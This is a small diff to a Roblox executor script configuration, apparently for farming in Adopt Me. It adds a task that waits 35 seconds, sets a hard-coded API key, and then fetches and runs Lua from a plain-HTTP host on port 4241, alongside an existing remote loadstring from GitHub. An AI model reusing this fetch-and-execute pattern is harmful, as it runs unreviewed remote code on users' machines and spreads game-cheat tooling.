@@ -49,3 +49,14 @@ getgenv().VO_CONFIG = {
     ExtraOpti = false  -- Experimental; may cause issues
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/voltrex2/VoHub/refs/heads/main/FARM"))()
+
+task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "En0qsIBEECaHRJQ7HYVAvsyqL"
+    getgenv().GroupName = "farm2"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+task.spawn(function()
+    -- add other scripts here
+end)
